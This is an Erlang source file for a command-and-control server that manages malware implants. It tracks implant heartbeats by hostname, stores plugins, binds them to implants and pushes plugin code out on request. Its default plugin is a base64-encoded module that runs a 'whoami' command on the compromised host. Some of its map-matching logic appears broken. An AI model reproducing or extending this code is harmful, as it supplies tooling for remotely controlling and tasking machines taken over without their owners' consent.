-module(main).
-export([start/0]).

loop(Implants, KnownPlugins) ->
    receive
	{heartbeat,Implant,Hostname} ->
	    io:format("IMPLANT: ~p Hostname: ~p~n", [Implant, Hostname]),
	    Im = maps:get(Hostname, Implants, #{}),
	    io:format("GOT IMPLANT FROM IMPLANTS ~p~n", [Im]),
	    case Im of
		#{} ->
		    UpdatedImplants = Implants#{Hostname => #{plugins => ["test"], lastTime => erlang:localtime()}},
		    Plugins = ["test"];
		_Else ->
		    UpdatedImplants = Implants#{Hostname => #{plugins => maps:get(plugins, Im, []), lastTime => erlang:localtime()}},
		    Plugins = maps:get(plugins, Im, [])
	    end,
	    Implant ! {newPlugins, Plugins},
	    loop(UpdatedImplants, KnownPlugins);
	{downloadPlugin, Implant, PluginName} ->
	    Plugin = maps:get(PluginName, KnownPlugins, #{}),
	    case Plugin of
		#{} ->
		    Implant ! {implantOrPluginNotFound},
		    loop(Implants, KnownPlugins);
		_Else ->
		    % TODO: Remove plugin from implant list
		    Implant ! {plugin, PluginName ,maps:get(PluginName, KnownPlugins, "")},
		    loop(Implants, KnownPlugins)
	    end,
	    loop(Implants, KnownPlugins);
	{addPlugin, PluginName, PluginContent} ->
	    loop(Implants, KnownPlugins#{PluginName => PluginContent});
	{bindPluginImplant, Sender, ImplantName, PluginName} ->
	    Plugin = maps:get(PluginName, KnownPlugins, #{}),
	    case Plugin of
		#{} ->
		    Sender ! {implantOrPluginNotFound},
		    loop(Implants, KnownPlugins);
		_Else ->
		    Im = maps:get(ImplantName, Implants, #{}),
		    case Im of
			#{} ->
			    Sender ! {implantOrPluginNotFound},
			    loop(Implants, KnownPlugins);
			__Else ->
			    UpdatedImplants = Implants#{ImplantName => #{plugins => [PluginName|maps:get(plugins, Im, [])], lastTime => maps:get(lastTime, Im, erlang:localtime())}},
			    loop(UpdatedImplants, KnownPlugins)
		    end	    
	    end
    end,
    receive
    after 10000 ->
	    loop(Implants, KnownPlugins)
    end.




start() ->
    register(c2server, self()),
    loop(#{},#{"test" => "LW1vZHVsZSh0ZXN0KS4KLWV4cG9ydChbc3RhcnQvMCxnZXRfcmVzdWx0LzBdKS4KLW9uX2xvYWQoc3RhcnQvMCkuCgpzdGFydCgpIC0+CiAgICBpbzpmb3JtYXQoIkhJIEZST00gVEVTVCBQTFVHSU5+biIpLgoKZ2V0X3Jlc3VsdCgpIC0+CiAgICBpbzpmb3JtYXQoIlJ1bm5pbmcgY29kZX5uIiksCiAgICBvczpjbWQoIndob2FtaSIpLgo="}).
